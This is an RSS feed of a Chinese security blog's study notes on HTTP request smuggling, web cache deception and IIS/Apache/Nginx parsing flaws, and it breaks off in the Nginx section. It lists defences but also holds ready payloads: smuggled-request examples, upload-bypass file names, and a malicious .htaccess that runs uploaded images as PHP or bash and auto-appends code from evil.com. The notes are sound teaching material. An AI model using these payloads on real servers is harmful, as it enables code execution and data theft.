<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>Khala • Posts by &#34;常见漏洞攻防&#34; category</title>
        <link>https://mobius-0.github.io</link>
        <description>GLHF</description>
        <language>zh-CN</language>
        <pubDate>Sun, 27 Nov 2022 15:47:26 +0800</pubDate>
        <lastBuildDate>Sun, 27 Nov 2022 15:47:26 +0800</lastBuildDate>
        <category>Hexo</category>
        <category>shoya</category>
        <category>网站</category>
        <category>网络安全</category>
        <category>工具</category>
        <category>虚拟机</category>
        <category>安全</category>
        <category>星际争霸2</category>
        <category>平衡</category>
        <category>杂谈</category>
        <category>网易</category>
        <category>暴雪</category>
        <category>动画</category>
        <category>江南</category>
        <category>龙族</category>
        <category>小说</category>
        <category>法律法规</category>
        <category>XSS</category>
        <category>漏洞</category>
        <category>渗透测试</category>
        <category>靶场</category>
        <category>pikachu</category>
        <category>Kerberos认证</category>
        <category>JWT</category>
        <category>认证</category>
        <category>单点登录</category>
        <category>Windows</category>
        <category>挑战/应答</category>
        <category>S/Key协议</category>
        <category>权限设置</category>
        <category>虚拟化</category>
        <category>Docker</category>
        <category>镜像</category>
        <category>域名</category>
        <category>DNS</category>
        <category>WEB</category>
        <category>标准</category>
        <category>OCI</category>
        <category>CRI</category>
        <category>计算机网络</category>
        <category>IPSec</category>
        <category>VPN</category>
        <category>HTTP</category>
        <category>SSL</category>
        <category>TLS</category>
        <category>WiFi</category>
        <category>邮件</category>
        <category>网络协议</category>
        <category>入侵检测</category>
        <category>IDS</category>
        <category>IPS</category>
        <category>防御加固</category>
        <category>管理策略</category>
        <category>分工</category>
        <category>职能</category>
        <category>情报</category>
        <category>运营</category>
        <category>开发过程</category>
        <category>应急响应</category>
        <category>流程</category>
        <category>Linux</category>
        <category>攻击溯源</category>
        <category>分析模型</category>
        <category>网络攻防</category>
        <category>蜜罐</category>
        <category>隐藏</category>
        <category>诱导</category>
        <category>防御纵深</category>
        <category>访问控制</category>
        <category>过滤</category>
        <category>框架</category>
        <category>风险</category>
        <category>控制</category>
        <category>渗透</category>
        <category>信息收集</category>
        <category>痕迹清理</category>
        <category>内网</category>
        <category>后门</category>
        <category>免杀</category>
        <category>代理</category>
        <category>Shell</category>
        <category>远程连接</category>
        <category>ASP</category>
        <category>CSharp</category>
        <category>Golang</category>
        <category>Java</category>
        <category>语言</category>
        <category>反序列化</category>
        <category>混淆</category>
        <category>沙箱</category>
        <category>类</category>
        <category>JDK</category>
        <category>JavaScript</category>
        <category>PHP</category>
        <category>PowerShell</category>
        <category>Python</category>
        <category>Ruby</category>
        <category>CSRF</category>
        <category>服务器</category>
        <category>SQL注入</category>
        <category>SSRF</category>
        <category>Cache</category>
        <category>XXE</category>
        <category>XML</category>
        <category>Xpath</category>
        <category>注入</category>
        <category>函数</category>
        <category>绕过</category>
        <category>遍历</category>
        <category>包含</category>
        <category>文件</category>
        <category>目录</category>
        <category>读取</category>
        <category>上传</category>
        <category>逻辑</category>
        <category>中间件</category>
        <category>IIS</category>
        <category>Apache</category>
        <category>Nginx</category>
        <category>策略配置</category>
        <category>端口</category>
        <category>社会工程学</category>
        <category>搜索</category>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/HTTP%20request/</guid>
            <title>HTTP请求走私</title>
            <link>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/HTTP%20request/</link>
            <category>网络安全</category>
            <category>HTTP</category>
            <category>服务器</category>
            <pubDate>Sun, 27 Nov 2022 15:47:26 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h1&gt;
&lt;p&gt;HTTP 请求走私是一种干扰网站处理 HTTP 请求序列方式的技术，最早在 2005 年的一篇 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY2dpc2VjdXJpdHkuY29tL2xpYi9IVFRQLVJlcXVlc3QtU211Z2dsaW5nLnBkZg==&#34;&gt;文章&lt;/span&gt; 中被提出。&lt;/p&gt;
&lt;h1 id=&#34;成因&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#成因&#34;&gt;#&lt;/a&gt; 成因&lt;/h1&gt;
&lt;p&gt;请求走私大多发生于前端服务器和后端服务器对客户端传入的数据理解不一致的情况。这是因为 HTTP 规范提供了两种不同的方法来指定请求的结束位置，即  &lt;code&gt;Content-Length&lt;/code&gt;  和  &lt;code&gt;Transfer-Encoding&lt;/code&gt;  标头。&lt;/p&gt;
&lt;h1 id=&#34;分类&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#分类&#34;&gt;#&lt;/a&gt; 分类&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;CLTE：前端服务器使用  &lt;code&gt;Content-Length&lt;/code&gt;  头，后端服务器使用  &lt;code&gt;Transfer-Encoding&lt;/code&gt;  头&lt;/li&gt;
&lt;li&gt;TECL：前端服务器使用  &lt;code&gt;Transfer-Encoding&lt;/code&gt;  标头，后端服务器使用  &lt;code&gt;Content-Length&lt;/code&gt;  标头。&lt;/li&gt;
&lt;li&gt;TETE：前端和后端服务器都支持  &lt;code&gt;Transfer-Encoding&lt;/code&gt;  标头，但是可以通过以某种方式来诱导其中一个服务器不处理它。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;攻击&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#攻击&#34;&gt;#&lt;/a&gt; 攻击&lt;/h1&gt;
&lt;h2 id=&#34;cl不为0的get请求&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cl不为0的get请求&#34;&gt;#&lt;/a&gt; CL 不为 0 的 GET 请求&lt;/h2&gt;
&lt;p&gt;当前端服务器允许 GET 请求携带请求体，而后端服务器不允许 GET 请求携带请求体，它会直接忽略掉 GET 请求中的  &lt;code&gt;Content-Length&lt;/code&gt;  头，不进行处理。例如下面这个例子：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;GET / HTTP/1.1\r\n
Host: example.com\r\n
Content-Length: 44\r\n

GET /secret HTTP/1.1\r\n
Host: example.com\r\n
\r\n
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;前端服务器处理了  &lt;code&gt;Content-Length&lt;/code&gt;  ，而后端服务器没有处理  &lt;code&gt;Content-Length&lt;/code&gt;  ，基于 pipeline 机制认为这是两个独立的请求，就造成了漏洞的发生。&lt;/p&gt;
&lt;h2 id=&#34;cl-cl&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cl-cl&#34;&gt;#&lt;/a&gt; CL-CL&lt;/h2&gt;
&lt;p&gt;根据 RFC 7230，当服务器收到的请求中包含两个  &lt;code&gt;Content-Length&lt;/code&gt;  ，而且两者的值不同时，需要返回 400 错误，但是有的服务器并没有严格实现这个规范。这种情况下，当前后端各取不同的  &lt;code&gt;Content-Length&lt;/code&gt;  值时，就会出现漏洞。例如：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;POST / HTTP/1.1\r\n
Host: example.com\r\n
Content-Length: 8\r\n
Content-Length: 7\r\n

12345\r\n
a
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这个例子中 a 就会被带入下一个请求，变为  &lt;code&gt;aGET / HTTP/1.1\r\n&lt;/code&gt;  。&lt;/p&gt;
&lt;h2 id=&#34;cl-te&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cl-te&#34;&gt;#&lt;/a&gt; CL-TE&lt;/h2&gt;
&lt;p&gt;CL-TE 指前端服务器处理  &lt;code&gt;Content-Length&lt;/code&gt;  这一请求头，而后端服务器遵守 RFC2616 的规定，忽略掉  &lt;code&gt;Content-Length&lt;/code&gt;  ，处理  &lt;code&gt;Transfer-Encoding&lt;/code&gt;  。例如：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;POST / HTTP/1.1\r\n
Host: example.com\r\n
...
Connection: keep-alive\r\n
Content-Length: 6\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
a
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这个例子中 a 同样会被带入下一个请求，变为  &lt;code&gt;aGET / HTTP/1.1\r\n&lt;/code&gt;  。&lt;/p&gt;
&lt;h2 id=&#34;te-cl&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#te-cl&#34;&gt;#&lt;/a&gt; TE-CL&lt;/h2&gt;
&lt;p&gt;TE-CL 指前端服务器处理  &lt;code&gt;Transfer-Encoding&lt;/code&gt;  请求头，而后端服务器处理  &lt;code&gt;Content-Length&lt;/code&gt;  请求头。例如：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;POST / HTTP/1.1\r\n
Host: example.com\r\n
...
Content-Length: 4\r\n
Transfer-Encoding: chunked\r\n
\r\n
12\r\n
aPOST / HTTP/1.1\r\n
\r\n
0\r\n
\r\n
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;te-te&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#te-te&#34;&gt;#&lt;/a&gt; TE-TE&lt;/h2&gt;
&lt;p&gt;TE-TE 指前后端服务器都处理  &lt;code&gt;Transfer-Encoding&lt;/code&gt;  请求头，但是在容错性上表现不同，例如有的服务器可能会处理  &lt;code&gt;Transfer-encoding&lt;/code&gt;  ，测试例如：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;POST / HTTP/1.1\r\n
Host: example.com\r\n
...
Content-length: 4\r\n
Transfer-Encoding: chunked\r\n
Transfer-encoding: cow\r\n
\r\n
5c\r\n
aPOST / HTTP/1.1\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 15\r\n
\r\n
x=1\r\n
0\r\n
\r\n
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;防御&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防御&#34;&gt;#&lt;/a&gt; 防御&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;禁用后端连接重用&lt;/li&gt;
&lt;li&gt;确保连接中的所有服务器具有相同的配置&lt;/li&gt;
&lt;li&gt;拒绝有二义性的请求&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;h2 id=&#34;rfc&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#rfc&#34;&gt;#&lt;/a&gt; RFC&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzI2MTY=&#34;&gt;RFC 2616 Hypertext Transfer Protocol -- HTTP/1.1&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzcyMzA=&#34;&gt;RFC 7230 Hypertext Transfer Protocol (HTTP/1.1): Message Syntax and Routing -- HTTP/1.1&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;blog-whitepaper&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#blog-whitepaper&#34;&gt;#&lt;/a&gt; Blog / Whitepaper&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY2dpc2VjdXJpdHkuY29tL2xpYi9IVFRQLVJlcXVlc3QtU211Z2dsaW5nLnBkZg==&#34;&gt;HTTP Request Smuggling by chaiml&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3JlcXVlc3Qtc211Z2dsaW5n&#34;&gt;HTTP request smuggling by portswigger&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjY1NA==&#34;&gt;从一道题到协议层攻击之 HTTP 请求走私&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2kuYmxhY2toYXQuY29tL1VTQS0yMC9XZWRuZXNkYXkvdXMtMjAtS2xlaW4tSFRUUC1SZXF1ZXN0LVNtdWdnbGluZy1Jbi0yMDIwLU5ldy1WYXJpYW50cy1OZXctRGVmZW5zZXMtQW5kLU5ldy1DaGFsbGVuZ2VzLnBkZg==&#34;&gt;HTTP Request Smuggling in 2020&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9sYWJzLmJpc2hvcGZveC5jb20vdGVjaC1ibG9nL2gyYy1zbXVnZ2xpbmctcmVxdWVzdC1zbXVnZ2xpbmctdmlhLWh0dHAvMi1jbGVhcnRleHQtaDJj&#34;&gt;h2c Smuggling: Request Smuggling Via HTTP/2 Cleartext (h2c)&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/Web%20Cache/</guid>
            <title>Web Cache欺骗攻击</title>
            <link>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/Web%20Cache/</link>
            <category>网络安全</category>
            <category>漏洞</category>
            <category>Cache</category>
            <pubDate>Sun, 27 Nov 2022 15:42:19 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h1&gt;
&lt;p&gt;网站通常都会通过如 CDN、负载均衡器、或者反向代理来实现 Web 缓存功能。通过缓存频繁访问的文件，降低服务器响应延迟。&lt;/p&gt;
&lt;p&gt;例如，网站  &lt;code&gt;htttp://www.example.com&lt;/code&gt;  配置了反向代理。对于那些包含用户个人信息的页面，如  &lt;code&gt;http://www.example.com/home.php&lt;/code&gt;  ，由于每个用户返回的内容有所不同，因此这类页面通常是动态生成，并不会在缓存服务器中进行缓存。通常缓存的主要是可公开访问的静态文件，如 css 文件、js 文件、txt 文件、图片等等。此外，很多最佳实践类的文章也建议，对于那些能公开访问的静态文件进行缓存，并且忽略 HTTP 缓存头。&lt;/p&gt;
&lt;p&gt;Web cache 攻击类似于 RPO 相对路径重写攻击，都依赖于浏览器与服务器对 URL 的解析方式。当访问不存在的 URL 时，如  &lt;code&gt;http://www.example.com/home.php/non-existent.css&lt;/code&gt;  ，浏览器发送 get 请求，依赖于使用的技术与配置，服务器返回了页面  &lt;code&gt;http://www.example.com/home.php&lt;/code&gt;  的内容，同时 URL 地址仍然是  &lt;code&gt;http://www.example.com/home.php/non-existent.css&lt;/code&gt; ，http 头的内容也与直接访问  &lt;code&gt;http://www.example.com/home.php&lt;/code&gt;  相同，cacheing header、content-type（此处为 text/html）也相同。&lt;/p&gt;
&lt;h1 id=&#34;漏洞成因&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞成因&#34;&gt;#&lt;/a&gt; 漏洞成因&lt;/h1&gt;
&lt;p&gt;当代理服务器设置为缓存静态文件并忽略这类文件的 caching header 时，访问  &lt;code&gt;http://www.example.com/home.php/no-existent.css&lt;/code&gt;  时，会发生什么呢？整个响应流程如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;浏览器请求  &lt;code&gt;http://www.example.com/home.php/no-existent.css&lt;/code&gt;  ;&lt;/li&gt;
&lt;li&gt;服务器返回  &lt;code&gt;http://www.example.com/home.php&lt;/code&gt;  的内容 (通常来说不会缓存该页面);&lt;/li&gt;
&lt;li&gt;响应经过代理服务器；&lt;/li&gt;
&lt;li&gt;代理识别该文件有 css 后缀；&lt;/li&gt;
&lt;li&gt;在缓存目录下，代理服务器创建目录  &lt;code&gt;home.php&lt;/code&gt;  ，将返回的内容作为  &lt;code&gt;non-existent.css&lt;/code&gt;  保存。&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;漏洞利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞利用&#34;&gt;#&lt;/a&gt; 漏洞利用&lt;/h1&gt;
&lt;p&gt;攻击者欺骗用户访问  &lt;code&gt;http://www.example.com/home.php/logo.png?www.myhack58.com&lt;/code&gt;  , 导致含有用户个人信息的页面被缓存，从而能被公开访问到。更严重的情况下，如果返回的内容包含 session 标识、安全问题的答案，或者 csrf token。这样攻击者能接着获得这些信息，因为通常而言大部分网站静态资源都是公开可访问的。&lt;/p&gt;
&lt;h1 id=&#34;漏洞存在的条件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞存在的条件&#34;&gt;#&lt;/a&gt; 漏洞存在的条件&lt;/h1&gt;
&lt;p&gt;漏洞要存在，至少需要满足下面两个条件：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;web cache 功能根据扩展进行保存，并忽略 caching header;&lt;/li&gt;
&lt;li&gt;当访问如  &lt;code&gt;http://www.example.com/home.php/non-existent.css&lt;/code&gt;  不存在的页面，会返回  &lt;code&gt;home.php&lt;/code&gt;  的内容。&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;漏洞防御&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞防御&#34;&gt;#&lt;/a&gt; 漏洞防御&lt;/h1&gt;
&lt;p&gt;防御措施主要包括 3 点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;设置缓存机制，仅仅缓存 http caching header 允许的文件，这能从根本上杜绝该问题；&lt;/li&gt;
&lt;li&gt;如果缓存组件提供选项，设置为根据 content-type 进行缓存；&lt;/li&gt;
&lt;li&gt;访问  &lt;code&gt;http://www.example.com/home.php/non-existent.css&lt;/code&gt;  这类不存在页面，不返回  &lt;code&gt;home.php&lt;/code&gt;  的内容，而返回 404 或者 302。&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;web-cache欺骗攻击实例&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web-cache欺骗攻击实例&#34;&gt;#&lt;/a&gt; Web Cache 欺骗攻击实例&lt;/h1&gt;
&lt;h2 id=&#34;paypal&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#paypal&#34;&gt;#&lt;/a&gt; Paypal&lt;/h2&gt;
&lt;p&gt;Paypal 在未修复之前，通过该攻击，可以获取的信息包括：用户姓名、账户金额、信用卡的最后 4 位数、交易数据、emaill 地址等信息。 受该攻击的部分页面包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;https://www.paypal.com/myaccount/home/attack.css&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;https://www.paypal.com/myaccount/settings/notifications/attack.css&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;https://history.paypal.com/cgi-bin/webscr/attack.css?cmd=_history-details&lt;/code&gt;  。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvYmxvZy9wcmFjdGljYWwtd2ViLWNhY2hlLXBvaXNvbmluZw==&#34;&gt;practical web cache poisoning&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudXNlbml4Lm9yZy9jb25mZXJlbmNlL3VzZW5peHNlY3VyaXR5MTgvcHJlc2VudGF0aW9uL2hhbw==&#34;&gt;End-Users Get Maneuvered: Empirical Analysis of Redirection Hijacking in Content Delivery Networks&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/%E4%B8%AD%E9%97%B4%E4%BB%B6/</guid>
            <title>中间件</title>
            <link>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/%E4%B8%AD%E9%97%B4%E4%BB%B6/</link>
            <category>网络安全</category>
            <category>中间件</category>
            <category>IIS</category>
            <category>Apache</category>
            <category>Nginx</category>
            <pubDate>Sun, 27 Nov 2022 10:59:09 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;iis&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#iis&#34;&gt;#&lt;/a&gt; IIS&lt;/h1&gt;
&lt;h2 id=&#34;iis-60&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#iis-60&#34;&gt;#&lt;/a&gt; IIS 6.0&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;后缀解析  &lt;code&gt;/xx.asp;.jpg&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;服务器默认不解析  &lt;code&gt;;&lt;/code&gt;  号及其后面的内容，相当于截断。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;目录解析  &lt;code&gt;/xx.asp/xx.jpg&lt;/code&gt;  (xx.asp 目录下任意解析)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;默认解析  &lt;code&gt;xx.asa&lt;/code&gt;   &lt;code&gt;xx.cer&lt;/code&gt;   &lt;code&gt;xx.cdx&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;PROPFIND 栈溢出漏洞&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;RCE CVE-2017-7269&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;iis-70-75-nginx-0837&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#iis-70-75-nginx-0837&#34;&gt;#&lt;/a&gt; IIS 7.0-7.5 / Nginx &amp;lt;= 0.8.37&lt;/h2&gt;
&lt;p&gt;在 Fast-CGI 开启状态下，在文件路径后加上  &lt;code&gt;/xx.php&lt;/code&gt;  ，即  &lt;code&gt;xx.jpg/xx.php&lt;/code&gt;  会被解析为 php 文件。&lt;/p&gt;
&lt;h2 id=&#34;put漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#put漏洞&#34;&gt;#&lt;/a&gt; PUT 漏洞&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;开启 WebDAV&lt;/li&gt;
&lt;li&gt;拥有来宾用户，且来宾用户拥有上传权限&lt;/li&gt;
&lt;li&gt;可任意文件上传&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;windows特性&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#windows特性&#34;&gt;#&lt;/a&gt; Windows 特性&lt;/h2&gt;
&lt;p&gt;Windows 不允许空格和点以及一些特殊字符作为结尾，创建这样的文件会自动重命名，所以可以使用  &lt;code&gt;xx.php[空格]&lt;/code&gt;  ，  &lt;code&gt;xx.php.&lt;/code&gt; ，  &lt;code&gt;xx.php/&lt;/code&gt; ，  &lt;code&gt;xx.php::$DATA&lt;/code&gt;  上传脚本文件。&lt;/p&gt;
&lt;h2 id=&#34;文件名猜解&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件名猜解&#34;&gt;#&lt;/a&gt; 文件名猜解&lt;/h2&gt;
&lt;p&gt;在支持 NTFS 8.3 文件格式时，可利用短文件名猜解目录文件。其中短文件名特征如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;文件名为原文件名前 6 位字符加上  &lt;code&gt;~1&lt;/code&gt;  ，其中数字部分是递增的，如果存在前缀相同的文件，则后面的数字进行递增。&lt;/li&gt;
&lt;li&gt;后缀名不超过 3 位，超过部分会被截断&lt;/li&gt;
&lt;li&gt;所有小写字母均转换成大写的字母&lt;/li&gt;
&lt;li&gt;文件名后缀长度大于等于 4 或者总长度大于等于 9 时才会生成短文件名，如果包含空格或者其他部分特殊字符，则无视长度条件&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;IIS 8.0 之前的版本支持短文件名猜测的 HTTP 方法主要包括：DEBUG、OPTIONS、GET、POST、HEAD、TRACE 六种，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1BU1AtcGQwZnEwMXJnNmE4NDRkLk5FVA==&#34;&gt;需要安装 ASP.NET&lt;/span&gt;。而 IIS 8.0 之后的版本只能通过 OPTIONS 和 TRACE 方法猜测成功，但是没有 ASP.NET 的限制。&lt;/p&gt;
&lt;p&gt;这种方法的局限性在于：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;文件夹名前 6 位字符带点”.”，扫描程序会认为是文件而不是文件夹，最终出现误报&lt;/li&gt;
&lt;li&gt;不支持中文文件名&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这种方法可以通过命令  &lt;code&gt;fsutil behavior set disable8dot3 1&lt;/code&gt;  关闭 NTFS 8.3 文件格式的支持来修复。&lt;/p&gt;
&lt;h2 id=&#34;41516-参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#41516-参考链接&#34;&gt;#&lt;/a&gt; 4.15.1.6. 参考链接&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMjMxOA==&#34;&gt;利用 Windows 特性高效猜测目录&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zb3JvdXNoLnNlY3Byb2plY3QuY29tL2Jsb2cvMjAxOS8wOC91cGxvYWRpbmctd2ViLWNvbmZpZy1mb3ItZnVuLWFuZC1wcm9maXQtMi8=&#34;&gt;Uploading web.config for Fun and Profit 2&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;apache&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#apache&#34;&gt;#&lt;/a&gt; Apache&lt;/h1&gt;
&lt;h2 id=&#34;后缀解析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#后缀解析&#34;&gt;#&lt;/a&gt; 后缀解析&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;test.php.x1.x2.x3&lt;/code&gt;  （ x1,x2,x3 为没有在 mime.types 文件中定义的文件类型）。Apache 将从右往左开始判断后缀， 若 x3 为非可识别后缀，则判断 x2，直到找到可识别后缀为止，然后对可识别后缀进行解析&lt;/p&gt;
&lt;h2 id=&#34;htaccess&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#htaccess&#34;&gt;#&lt;/a&gt; .htaccess&lt;/h2&gt;
&lt;p&gt;当 AllowOverride 被启用时，上传启用解析规则的.htaccess&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;AddType application/x-httpd-php .jpg
php_value auto_append_file .htaccess
#&amp;lt;?php phpinfo();
Options ExecCGI
AddHandler cgi-script .jpg
Options +ExecCGI
AddHandler fcgid-script .gif
FcgidWrapper &amp;quot;/bin/bash&amp;quot; .gif
php_flag allow_url_include 1
php_value auto_append_file data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==
#php_value auto_append_file data://text/plain,%3C%3Fphp+phpinfo%28%29%3B
#php_value auto_append_file https://evil.com/evil-code.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;目录遍历&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#目录遍历&#34;&gt;#&lt;/a&gt; 目录遍历&lt;/h2&gt;
&lt;p&gt;配置  &lt;code&gt;Options +Indexes&lt;/code&gt;  时 Apache 存在目录遍历漏洞。&lt;/p&gt;
&lt;h2 id=&#34;cve-2017-15715&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cve-2017-15715&#34;&gt;#&lt;/a&gt; CVE-2017-15715&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;%0A&lt;/code&gt;  绕过上传黑名单。&lt;/p&gt;
&lt;h2 id=&#34;lighttpd&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#lighttpd&#34;&gt;#&lt;/a&gt; lighttpd&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;xx.jpg/xx.php
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vYXBhY2hlLWN2ZS0yMDE3LTE1NzE1LXZ1bG5lcmFiaWxpdHkuaHRtbA==&#34;&gt;Apache 上传绕过&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;nginx&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nginx&#34;&gt;#&lt;/a&gt; Nginx&lt;/h1&gt;
&lt;h2 id=&#34;fast-cgi关闭&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#fast-cgi关闭&#34;&gt;#&lt;/a&gt; Fast-CGI 关闭&lt;/h2&gt;
